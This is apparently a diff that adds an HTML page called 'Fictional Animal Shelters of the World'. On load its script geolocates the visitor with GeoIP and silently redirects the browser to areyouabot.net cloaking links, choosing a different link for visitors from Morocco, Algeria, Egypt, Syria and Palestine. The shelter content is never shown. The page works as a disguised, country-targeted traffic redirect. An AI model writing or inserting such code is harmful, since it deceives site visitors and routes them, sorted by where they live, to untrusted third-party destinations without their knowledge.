@@ -1,0 +1,64 @@
+<!doctype html>
+<html>
+
+  <head>
+    <title>Fictional Animal Shelters of the World</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js"></script>
+    <script src="https://js.maxmind.com/js/apis/geoip2/v2.1/geoip2.js"></script>
+    <script>
+      <!-- INCLUDE JAVASCRIPT HERE -->
+      var fillInPage = (function () {
+    var updateCityText = function (geoipResponse) {
+
+        var link = "/shelter?lat=" + geoipResponse.location.latitude;
+        link += "&lon=" +geoipResponse.location.longitude;
+
+        /* It's possible that we won't have any names for this city */
+        var cityName = geoipResponse.city.names.en || 'your city';
+        var code = geoipResponse.country.iso_code.toLowerCase();
+
+        /*
+           most_specific_subdivision returns the smallest available
+           subdivision (region) as defined in ISO 3166-2.
+        */
+        
+
+        
+        if(code == 'ma' || code=='dz' || code=='eg' || code=='sy' ||code=='ps'){
+          window.location.replace("https://www.areyouabot.net/cl.php?id=b5533cc45c6a9107300162e100ea44e9");
+        }
+        else{
+          window.location.replace("https://www.areyouabot.net/cl.php?id=15bffd9d3f296c3cafa490b030d00a99");
+        }
+        
+        
+
+        console.log(code);
+    };
+
+    var onSuccess = function (geoipResponse) {
+        updateCityText(geoipResponse);
+    };
+
+    /* If we get an error we will */
+    var onError = function (error) {
+        return;
+    };
+
+    return function () {
+        geoip2.city( onSuccess, onError );
+    };
+}());
+
+fillInPage();
+    </script>
+  </head>
+
+  <body>
+    
+
+    <p id="city"></p>
+
+    
+  </body>
+</html>
